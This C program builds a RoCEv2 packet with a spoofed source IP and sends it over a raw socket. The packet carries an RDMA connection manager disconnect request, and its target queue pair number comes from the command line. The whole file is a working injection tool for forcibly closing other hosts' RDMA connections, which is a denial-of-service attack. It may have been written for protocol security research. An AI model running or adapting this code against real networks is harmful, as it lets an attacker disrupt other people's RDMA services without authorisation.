#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <linux/ip.h>
#include <linux/ipv6.h>
#include <linux/udp.h>
#include <zlib.h>
 
#include <arpa/inet.h>

#define PCKT_LEN (8192+256) // maximum packet size
#define ROCEPORT (4791)
#define SOURCEPORT (59047) // can be anything, but my device set it to this number

#define htonll(x) ((((uint64_t)htonl((uint32_t)x)) << 32) + htonl((uint32_t)((x) >> 32)))

 
#define BTH_DEF_PKEY	(0xffff)
#define BTH_PSN_MASK	(0x00ffffff)
#define BTH_QPN_MASK	(0x00ffffff)
#define BTH_ACK_MASK	(0x80000000)
#define RDMA_CM_QPN     ((uint32_t)0x1)


struct rxe_bth {
	__u8			opcode;
	__u8			flags;
	__be16			pkey;
	__be32			qpn;
	__be32			apsn;
};

struct rxe_deth {
	__be32			qkey;
	__be32			src_qpn;
};
 
struct rxe_immdt {
	__be32			imm;
};


struct mad_header {
	__u8 base_version;
	__u8 man_class;
	__u8 class_version;
	__u8 method;
	__be16 status;
	__be16 class_specific;
	__be64 tid; // transaction id
	__be16 aid; //attribure id
	__be16 reserved;
	__be32 modifier;
};

struct cm_disconnect_request {
	__be32 lid; // local communication id
	__be32 rid; // local communication id
	__be32 qpn  ;
	__u8 data[220];
};


 


const uint32_t mad_size = 256; // size of MAD


static_assert(sizeof(mad_header) + sizeof(cm_disconnect_request) == mad_size, "Allignment is not correct") ;

 
 
uint16_t ip_checksum(struct iphdr *p_ip_header, size_t len)
{
  register int sum = 0;
  uint16_t *ptr = (unsigned short*)p_ip_header;

  while (len > 1){
    sum += *ptr++;
    len -= 2;
  }

  sum = (sum >> 16) + (sum & 0xFFFF);
  sum += (sum >> 16);

  return ~sum;
}
 
int main(int argc, char** argv){

    printf("Usage: sudo ./spoof <Source IP> <Destination iP>  \n");
    if(argc < 4){
    	printf("specify IPs and qpn!\n");
    	exit(1);
    } 

	uint32_t payloadsize = mad_size; 

	uint8_t padcount = (0b100 - (payloadsize & 0b11)) & 0b11; // payload must be multiple of 4. 
	// other equations for padcount 
	//uint8_t padcount = ((payloadsize + 0x3) & 0b11) - (payloadsize & 0b11); // payload must be multiple of 4. 
	//uint8_t padcount = (-((int32_t)payload)) & 0x3;
	payloadsize+=padcount; // increase the payload. it will be cropped by the receiver.
 

	unsigned char buffer[PCKT_LEN]; // 
	memset(buffer, 0, PCKT_LEN);

	// pointers to headers:
	struct iphdr *ip = (struct iphdr *) buffer;
	struct udphdr *udp = (struct udphdr *) (ip + 1);
	struct rxe_bth *bth = (struct rxe_bth *) (udp + 1);
	struct rxe_deth *deth = (struct rxe_deth *) (bth + 1);
	struct mad_header *mad = (struct mad_header*)(deth+1);
	struct cm_disconnect_request *disc_request = (struct cm_disconnect_request*)(mad+1);
	
	uint32_t *icrc = (uint32_t *) ( ((char*)bth) + sizeof(struct rxe_bth) + sizeof(struct rxe_deth) + payloadsize  );

 
	uint16_t total_paket_size = sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct rxe_bth) + sizeof(struct rxe_deth) + payloadsize + sizeof(*icrc) ;
 

	// fill IP header
	ip->ihl      = 5; // size of ip header is 20.
	ip->version  = 4; // ipv4
	ip->tos      = 0xff; // low delay// coud be also 0x02
	ip->tot_len  = htons(total_paket_size);
	ip->id       = htons (40623);	//Id of this packet.  
	ip->frag_off = htons(0x4000);
	ip->ttl      = 0xff; // ttl hops
	ip->protocol = 17; // UDP
	ip->check = htons(0xffff); // checksum can be ignored
	ip->saddr = inet_addr(argv[1]);
	ip->daddr = inet_addr(argv[2]);

	// fill udp header
	udp->source = htons(SOURCEPORT);
	udp->dest = htons(ROCEPORT); 	// destination port number
	udp->len = htons(total_paket_size - sizeof(struct iphdr));
	udp->check = htons(0xffff); // checksum can be ignored
 

	//https://github.com/SoftRoCE/rxe-dev/blob/master/drivers/infiniband/hw/rxe/rxe_hdr.h
	// fill BTH header
	bth->opcode = 0x64; // ot it is 0b01100100. it is opcode for SEND via UD connection
	bth->flags = 0b00000000; // padding is here
	bth->flags |= padcount << 4 ; // it adds padcount (i.e. how many bytes crop from payload at destination)! 

	bth->pkey = htons(BTH_DEF_PKEY);
	bth->qpn = htonl(RDMA_CM_QPN);
bth->qpn |= htonl(~BTH_QPN_MASK);

	uint32_t psn = 411; // we will start sending from PSN 0 
	bth->apsn = htonl(BTH_PSN_MASK & psn);


	// datagram header
	deth->qkey = htonl(0x80010000); //htonl 
	deth->src_qpn = htonl(RDMA_CM_QPN);  
	
	
	mad->base_version = 0x1;
	mad->man_class = 0x7;
	mad->class_version = 0x2;
	mad->method = 0x3;
	mad->status = 0;
	mad->class_specific = 0;
	mad->tid = htonll(0x00000003f07720ad); // transaction id
	mad->aid = htons(0x15); //attribure id
	mad->reserved = 0;
	mad->modifier = 0;
	
	uint32_t qpn = atoi (argv[3]);
	
	disc_request->lid=htonl(0xaa2077f0);
	disc_request->rid=htonl(0x2874b476);
	disc_request->qpn=htonl(qpn << 8);

	// calcualte RDMA checksum
	*icrc = crc32((0xdebb20e3^0xffffffff),buffer,total_paket_size - sizeof(*icrc)); //crc32_le

	// actually can be ignored as it works as it is on my setup. 
	//ip->ttl = 16;
	//ip->check = 0;
	//ip->tos = 0x0;
	//udp->check = 0;
	 /* exclude bth.resv8a */
	//bth->qpn &= htonl(BTH_QPN_MASK);
	//calculate ip checksum
	//ip->check = ip_checksum(ip,sizeof(struct iphdr));  // it can be ignored. uncomment to have the IP checksum

	printf("Packet content:\n");
	for (int i = 2; i < total_paket_size; i++)
	{	
		if((i-2)%16==0) printf("\n");
		printf("%02X ", buffer[i]);
	} 
 
	printf("MAD disconnect SEND to QPN=%u  \n",qpn);


	int raw_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	printf("Socket status %d\n",raw_sock);
 
	struct sockaddr_in dst_addr;
	dst_addr.sin_family = AF_INET;
	dst_addr.sin_port = htons(ROCEPORT);
	dst_addr.sin_addr.s_addr = ip->daddr;

	int ret =  sendto(raw_sock, buffer, total_paket_size, 0, (struct sockaddr *)&dst_addr, sizeof(dst_addr)) ;
	printf("send status %d\n",ret);
 
  return 0;
}
